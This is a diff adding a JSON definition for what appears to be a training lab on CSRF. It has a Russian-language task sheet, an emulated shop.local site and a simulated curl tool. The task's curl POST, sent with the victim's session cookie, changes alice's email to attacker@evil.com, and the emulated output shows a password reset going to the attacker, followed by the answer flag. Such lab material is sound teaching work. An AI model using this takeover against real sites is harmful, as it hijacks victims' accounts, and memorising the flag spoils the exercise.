@@ -1,0 +1,46 @@
+{
+  "id": "web-csrf",
+  "workdir": "/home/student/task",
+  "hostname": "lab",
+  "expect": {
+    "file": "/home/student/task/found.txt",
+    "contains": "nto{csrf_n0_t0k3n_3ma1l_ch4ng3}"
+  },
+  "fs": [
+    {
+      "path": "/home/student/task",
+      "type": "dir"
+    },
+    {
+      "path": "/home/student/task/task.md",
+      "text": "# Практика: CSRF на смене email\n\nЦель — `shop.local`, форма смены email в профиле.\n\n1. Сними страницу профиля с cookie alice и проверь, есть ли в форме скрытое\n   поле `csrf_token`:\n\n   curl -s https://shop.local/profile -H 'Cookie: session=alice' > profile.html\n\n2. Если токена нет — форма уязвима к CSRF. Собери эксплойт, который от имени\n   жертвы отправит POST на `/profile/email` с новым email.\n\n3. Выполни POST с cookie жертвы и сохрани ответ в `found.txt`:\n\n   curl -s -X POST https://shop.local/profile/email -d 'email=attacker@evil.com' -H 'Cookie: session=alice' > found.txt\n\n4. Набери `check`.\n"
+    },
+    {
+      "path": "/home/student/task/profile.html",
+      "text": "<!doctype html>\n<title>Профиль — shop.local</title>\n<h1>Профиль alice</h1>\n<form action=\"/profile/email\" method=\"POST\">\n  <label>Email</label>\n  <input type=\"email\" name=\"email\" value=\"alice@example.com\">\n  <button type=\"submit\">Сохранить</button>\n</form>\n"
+    }
+  ],
+  "tools": {
+    "curl": {
+      "help": "curl [опции] <url> — HTTP-клиент (эмуляция shop.local)",
+      "cases": [
+        {
+          "match": "-d|--data|-x\\s*post|\\bpost\\b",
+          "example": "-X POST https://shop.local/profile/email -d email=attacker@evil.com",
+          "output": "HTTP/1.1 302 Found\nLocation: https://shop.local/profile\n\n[session] cookie alice accepted; CSRF token NOT checked\n[profile] email changed: alice@example.com -> attacker@evil.com\n[reset] password reset link issued to attacker@evil.com\nnto{csrf_n0_t0k3n_3ma1l_ch4ng3}\n"
+        },
+        {
+          "match": "profile",
+          "example": "-s https://shop.local/profile -H 'Cookie: session=alice'",
+          "output": "<!doctype html>\n<title>Профиль — shop.local</title>\n<h1>Профиль alice</h1>\n<form action=\"/profile/email\" method=\"POST\">\n  <label>Email</label>\n  <input type=\"email\" name=\"email\" value=\"alice@example.com\">\n  <button type=\"submit\">Сохранить</button>\n</form>\n"
+        },
+        {
+          "match": "shop\\.local",
+          "example": "-s https://shop.local/",
+          "output": "<!doctype html><title>shop.local</title>\n"
+        }
+      ],
+      "fallback": "curl: в этой лабе эмулируется shop.local.\n"
+    }
+  }
+}
